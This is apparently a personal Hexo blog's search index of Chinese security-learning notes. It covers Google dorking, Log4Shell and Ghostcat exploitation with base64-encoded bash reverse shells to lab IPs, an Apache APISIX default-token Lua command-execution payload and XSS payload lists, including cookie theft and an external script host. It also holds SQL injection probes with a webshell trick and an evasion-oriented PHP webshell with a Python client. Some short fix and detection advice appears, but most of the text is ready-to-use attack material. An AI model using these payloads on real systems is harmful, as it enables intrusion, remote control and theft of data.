[{"title":"Google hacking","url":"/tm_code.io/Learning/Google%20hacking.html","content":"Google hacking正文中含有关键字：intext\t intext:后台登录\n标题中含有关键字：intitle\tintitle:后台登录\n同上指定多词语：alltitle\t   alltitle:后台 管理员\nurl中包含关键词：inurl\t\tinurl:login  inurl:&#x2F;admin&#x2F;login.php\n​\t\t\t\t\t\t\t\t\t\t\t\t inurl:&#x2F;phpmyadmin&#x2F;index.php\nurl中指定多词：allinurl\n指定访问的站点：site\t\tsite:baidu.com inurl:login\n指定访问的文件类型：filetype \tsite:baidu.com filetype:pdf\n指定链接网页：link\t\t\tlink:baidu.com\n相似类型网页：related \t  related:xjtu.cn\n网页快照：cache\t\tcache:hackingspirits.com guest\n返回指定站点的指定信息：info info:baidu,com\n**返回某个词语的定义：define\t** define:Hacker \n电话普查询：phonebook\n查找网站后台**1.site:xx.com intext:admintor\t**\n**2.site:xx.com inurl:login\t**\n**3.site:xx.com intitle:后台\t**\n查看服务器使用的程序**1.site:xx.com filetype:asp\t**\n2.site:xx.com filetype:php\n3.site:xx.com filetype:jsp\n**4.site:xx.com filetype:aspx\t**\n查看上次漏洞**1.site:xx.com inurl:file\t**\n**2.site:xx.com inurl:load\t**\n\n","categories":["Learning"]},{"title":"Hello World","url":"/tm_code.io/uncategorized/hello-world.html","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n"},{"title":"WEB 安全","url":"/tm_code.io/Learning/WEB%20%E5%AE%89%E5%85%A8.html","content":"WEB 安全白盒其他平台 ：Css编辑器寻找语法 然后找到高危函数  \ntest &#123;  content: data-uri(&#x27;/etc/passwd&#x27;);&#125;202303071847\n\n反序列化：phpgcc这款工具来生成一个phar文件\n通过对刚才代码的分析就可以发现，file_exists和file_get_contents的完整路径可以被控制，也就是说这里可以使用任意协议。幸运的是，目标系统是PHP 7.4，支持使用phar:&#x2F;&#x2F;来构造反序列化，相比起来，PHP 8.0以上就不再支持phar反序列化了。\nJAVA 安全 反序列化 序列化 \nmysql –m -s server \n反引号 在PHP 和mysql的作用\n预渗透 网络钓鱼社工\n信息收集\n面经 day\nFCK 漏洞 Fckeditor漏洞利用总结 - milantgh - 博客园 (cnblogs.com)\n搭建FLARUM\n爆破\n获取DNS抓包：随机DNS获取网站:DSNLOG\nJAVA 配置\n后台\nLog4j2远程代码执行漏洞(cve-2021-44228)复现笔记内容log4j2存在JNDI注入漏洞，当程序记录用户输入的数据是，即可出发改漏洞。成功利用该漏洞可以在目标服务器上执行任意代码。\nJNDI实现原理JNDI通过lookup()方法解析接收自应用程序的信息，从而去对应的服务（如LDAP、RMI、DNS、文件系统、目录服务…）查找资源。格式 ${jndi:rmi:192.168.96.1:1099&#x2F;wqiyua}—&gt; ${jndi:&#x2F;&#x2F;ladp:&#x2F;&#x2F;dns地址} dns可以从 DNSLOG\n未进行URL加密的情况下发送导致发送400，进行加密后发送成功。\n\n\n结果情况\n\n选择 JNDI注入工具：JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar\nhttps://github.com/bkfish/Apache-Log4j-Learning/tree/main 下载网址\njava -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;命令&quot; -A &quot;ip(攻击机)&quot;\n\n示例 执行命令的加密内容不能直接抄\njava -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C “bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjkxLjEzMC80NDQ0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;” -A 192.168.109.128\n\n执行情况 和端口监听\n\n复现时遇到的问题配置Brupsuite时候 出现JAVA -jar 的命令执行 自己只尝试了java\n执行远程控制时，命令构造出现问题，直接复制别人的导致ip不对，对linux系统内的操作命令不熟悉导致\nBrup抓包配置使用\ndocker配置 \n排查1.可以通过检查日志中是否存在”jndi:ldap:&#x2F;&#x2F;“、”jndi:rmi”等字符来发现可能的攻击行为2.pom版本检查3.各种安全产品\n防御方法1.设置jvm参数 -Dlog4j2.formatMsgNoLookups&#x3D;true。由于Java RMI，的实现依赖于JVM，所以可以通过调用JVM来修改。2.设置log4j2.formatMsgNoLookups&#x3D;True。3.采用waf对请求流量中的${jndi进行拦截。通过对拦截JNDI语句来防止JNDI注入。4.禁止不必要的业务访问外网，配置网络防火墙,禁止系统主动外连网络，包含不限于DNS、TCP&#x2F;IP、ICMP。\n修复方法升级到最新的安全版本：log4j-2.15.0-rc2。Apache Log4j2 官方已经发布了解决上述漏洞的安全更新，建议尽快升级到安全版本。\nTomcat AJP文件包含漏洞(CVE-2020-1938)如何把文件上传上去？Tomcat AJP文件包含漏洞(CVE-2020-1938) - FreeBuf网络安全行业门户\n由tomact AJP中某一文件导致可以上传任意文件\n得到相应网址后可以用 相应的文件进行测试(利用POC进行攻击)\nYDHCUI&#x2F;CNVD-2020-10487-Tomcat-Ajp-lfi: Tomcat-Ajp协议文件读取漏洞 (github.com)\n工具网址如上 执行代码如下：\npython xxx.py ip -p port -f /WEB-INF/web.xml# 得到ip地址后 某人的Tomcat端口未8009 后续为指定文件路径# 得到文件源码即为成功\n\n通过上传任意文件上去对木马代码进行包装\n&#x27;&#x27;&#x27;这里的命令是想要靶机运行的命令，-A后放的是发出攻击的电脑的ip，也是存放-C后“命令”的ip地址。接下来要实现反弹shell，可以用命令bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;&#x27;&#x27;# bash -i &gt;&amp; /dev/tcp/192.168.111.129/4444 0&gt;&amp;1 # 不过一般会被过滤所以要通过base64加密#YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjkxLjEzMC80NDQ0IDA+Jj# 所以构成的执行语句即为&#x27;&#x27;&#x27;&lt;%Runtime.getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExMS4xMjkvNDQ0NCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;);%&gt;我们将payload写创建的随意文件后续上传到服务器中即可。&#x27;&#x27;&#x27;\n\n在另一边开启端口监控\nnc -lvvp 4444\n\n通过工具对上传的文件进行执行 工具地址\n00theway&#x2F;Ghostcat-CNVD-2020-10487: Ghostcat read file&#x2F;code execute,CNVD-2020-10487(CVE-2020-1938) (github.com) \nchmod +X ajpShooter.py #升级文件等级python3 ajpShooter.py http://192.168.111.133 8009 /cmd.txt eval# ip 地址 端口 文件名字 eval 执行\n\n\n监听窗口得到放回的shell 可以在监听窗口那得到其他内容\n\n修复建议1、将Tomcat立即升级到9.0.31，8.5.51或7.0.100版本进行修复。\n2、禁用AJP协议\n具体方法：编辑&#x2F;conf&#x2F;server.xml，找到如下行：\n&lt;Connector port&#x3D;”8009”protocol&#x3D;”AJP&#x2F;1.3” redirectPort&#x3D;”8443” &#x2F;&gt;\n将此行注释掉(也可删除掉该行)：\n\n\n3、配置secret来设置AJP协议的认证凭证。\n例如(注意必须将YOUR_TOMCAT_AJP_SECRET更改为一个安全性高，无法被轻易猜解的指)：\n&lt;Connector port&#x3D;”8009”protocol&#x3D;”AJP&#x2F;1.3” redirectPort&#x3D;”8443”address&#x3D;”YOUR_TOMCAT_IP_ADDRESS” secret&#x3D;”YOUR_TOMCAT_AJP_SECRET”&#x2F;&gt;\nApache APISIX 默认访问令牌漏洞 (CVE-2020-13945)在用户未指定管理员Token或使用了默认配置文件的情况下，Apache APISIX将使用默认的管理员Token edd1c9f034335f136f87ad84b625c8f1，攻击者利用这个Token可以访问到管理员接口，进而通过script参数来插入任意LUA脚本并执行\n&#123;    &quot;uri&quot;: &quot;/attack&quot;,&quot;script&quot;: &quot;local _M = &#123;&#125; \\n function _M.access(conf, ctx) \\n local os = require(&#x27;os&#x27;)\\n local args = assert(ngx.req.get_uri_args()) \\n local f = assert(io.popen(args.cmd, &#x27;r&#x27;))\\n local s = assert(f:read(&#x27;*a&#x27;))\\n ngx.say(s)\\n f:close()  \\n end \\nreturn _M&quot;,    &quot;upstream&quot;: &#123;        &quot;type&quot;: &quot;roundrobin&quot;,        &quot;nodes&quot;: &#123;            &quot;example.com:80&quot;: 1        &#125;    &#125;&#125;# 构建的payload # 使用burp抓包发送至目标服务器 # 返回 action：&quot;create&quot; 即为成功\n\n访问网址&#x2F;attack?cmd&#x3D;xxx构造任意语句执行\n如http://192.168.0.110:9080/attack?cmd=cat%20/etc/passwd\n常用Sql注入\n","categories":["Learning"]},{"title":"XSS 跨站脚本","url":"/tm_code.io/Learning/XSS%20%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC.html","content":"XSS 跨站脚本向Web页面插入恶意的Script代码，浏览时被执行\n存储型闭合当前的标签，插入\n# &gt; 可以用//代替 如 &lt;script&gt;alter(1)&lt;/script//# javasript&lt;script&gt;alert(&quot;hack&quot;)&lt;/script&gt;   #弹出hack&lt;script&gt;alert(/hack/)&lt;/script&gt;   #弹出hack&lt;script&gt;alert(1)&lt;/script&gt;        #弹出1，对于数字可以不用引号&lt;script&gt;alert(document.cookie)&lt;/script&gt;      #弹出cookie&lt;script src=http://xxx.com/xss.js&gt;&lt;/script&gt;  #引用外部的xss# svg标签&lt;svg onload=&quot;alert(1)&quot;&gt;&lt;svg onload=&quot;alert(1)&quot;//# img标签&lt;img  src=1  οnerrοr=alert(&quot;hack&quot;)&gt;&lt;img  src=1  οnerrοr=alert(document.cookie)&gt;  #弹出cookie# body标签&lt;body οnlοad=alert(1)&gt;&lt;body οnpageshοw=alert(1)&gt;# video标签&lt;video οnlοadstart=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;# style标签&lt;style οnlοad=alert(1)&gt;&lt;/style&gt;\n\n\n\n反射型DOM型XSS引用：XSS(跨站脚本攻击)详解 - 蒋璐 - 博客园 (cnblogs.com)\n","categories":["Learning"]},{"title":"asd","url":"/tm_code.io/Code/asd.html","content":"XSS 跨站脚本向Web页面插入恶意的Script代码，浏览时被执行\n存储型闭合当前的标签，插入\n# &gt; 可以用//代替 如 &lt;script&gt;alter(1)&lt;/script//# javasript&lt;script&gt;alert(&quot;hack&quot;)&lt;/script&gt;   #弹出hack&lt;script&gt;alert(/hack/)&lt;/script&gt;   #弹出hack&lt;script&gt;alert(1)&lt;/script&gt;        #弹出1，对于数字可以不用引号&lt;script&gt;alert(document.cookie)&lt;/script&gt;      #弹出cookie&lt;script src=http://xxx.com/xss.js&gt;&lt;/script&gt;  #引用外部的xss# svg标签&lt;svg onload=&quot;alert(1)&quot;&gt;&lt;svg onload=&quot;alert(1)&quot;//# img标签&lt;img  src=1  οnerrοr=alert(&quot;hack&quot;)&gt;&lt;img  src=1  οnerrοr=alert(document.cookie)&gt;  #弹出cookie# body标签&lt;body οnlοad=alert(1)&gt;&lt;body οnpageshοw=alert(1)&gt;# video标签&lt;video οnlοadstart=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;# style标签&lt;style οnlοad=alert(1)&gt;&lt;/style&gt;\n\n\n\n反射型DOM型XSS引用：XSS(跨站脚本攻击)详解 - 蒋璐 - 博客园 (cnblogs.com)\n","categories":["Code"]},{"title":"SQl注入","url":"/tm_code.io/Learning/SQL%E6%B3%A8%E5%85%A5.html","content":"SQL注入判断是否有注入;and 1=1 --1;and 1=2 --2\n\n是否为mysql;and user&gt;0\n\n判断数据库系统;and (select count(*) from sysobjects)&gt;0 --1 mysql;and (select count(*) from msysobjects)&gt;0 --2 access\n\n注入参数是字符&#x27;and [查询条件] and &quot;=&#x27; --1-- &#x27;and select database() and &quot;=&quot;\n\n搜查时没有过滤参数的&#x27;and [查询条件] and &#x27;%25&#x27;=&#x27;\n\n猜数据库\n\n猜字段mysql内置函数;and (select @@version) &gt;0 -- 获得windows版本号;and user_name() = &quot;dbo&quot; -- 连接用户是否为dbo;and (select user_name()) &gt; 0 --爆破当前连接;and (select db_name())&gt;0 -- 得到连接数据库;and (select user()) --用户名;and (slect database()) -- 数据库名;and (select @@datadir) -- 数据库路径\n\n\n\n间接的webshelluse modelcreate table cmd(str image);insert into cmd(str) values(&#x27;&#x27;);backup database model to disk=&quot;xxx\\1.asp&quot;;\n\n\n\n\n\n绕过过滤\n\n绕过防火墙\n\n","categories":["Learning"]},{"title":"Hexo部署个人博客","url":"/tm_code.io/Learning/Hexo%E9%83%A8%E7%BD%B2%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.html","content":"修改主题 以Arknights主题为例子(下载地址):[]\n\n修改根目录的_config.yml\ncopy theam&#x2F;arknights&#x2F;_arknightsconfig.yml\n\n修改分支分类\nhexo new post learning\n\n修改永久链接\n修改_config.yml\n\n配置github","categories":["Learning"]},{"title":"免杀利用","url":"/tm_code.io/Code/%E5%85%8D%E6%9D%80%E5%88%A9%E7%94%A8.html","content":"PHP脚本&lt;?//// PHP_KIT//// cmd.php = Command Execution//// by: The Dark Raver// modified: 21/01/2004//?&gt;&lt;HTML&gt;&lt;BODY&gt;&lt;FORM METHOD=&quot;GET&quot; NAME=&quot;myform&quot; ACTION=&quot;&quot;&gt;&lt;INPUT TYPE=&quot;text&quot; NAME=&quot;cmd&quot;&gt;&lt;INPUT TYPE=&quot;submit&quot; VALUE=&quot;Send&quot;&gt;&lt;/FORM&gt;&lt;pre&gt;&lt;?     // 用base64进行加解密后输出if($_GET[&#x27;cmd&#x27;]) &#123;  echo base64_encode(shell_exec(base64_decode($_GET[&#x27;cmd&#x27;])));  &#125;?&gt;&lt;/pre&gt;&lt;/BODY&gt;&lt;/HTML&gt;\n\n\n\n利用脚本&#x27;&#x27;&#x27;title: testabbrlink: 16107&#x27;&#x27;&#x27;# 上传文件后利用脚本进行命令执行import requestsimport base64import refind_pre = re.compile(r&quot;&lt;pre&gt;((?:.|\\n)*?)&lt;/pre&gt;&quot;)url = &quot;http://localhost/cmd.php?cmd=&quot;def post():    cmd = input(u&quot;请输入命令:&quot;)    bash = base64.b64encode(bytes(cmd,encoding=&#x27;utf-8&#x27;))    print(bash)    temp = url + str(bash,encoding=&quot;utf-8&quot;)    resp = requests.get(temp)    text = re.findall(find_pre,resp.text)[0]    text = base64.b64decode(text)    print(text.decode(&quot;gbk&quot;))while True:    post()\n\n\n\n\n\n\n\n后续— 需要编写JSP，ASP，ASPX","categories":["Code"]}]